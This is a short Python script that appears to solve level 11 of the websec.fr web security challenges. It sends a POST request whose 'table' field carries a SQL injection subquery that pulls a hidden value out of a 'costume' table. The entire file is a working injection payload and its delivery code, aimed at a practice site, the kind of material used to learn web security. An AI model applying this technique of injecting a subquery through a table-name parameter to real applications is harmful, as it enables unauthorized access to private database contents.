from requests import *

url = 'http://websec.fr/level11/index.php'
data = {
    'user_id' : '2',
    'table' : '(select 2 id,enemy username from costume where id like 1)',
    'submit' : 'Submit'
}

r = post(url , data=data)
print r.text
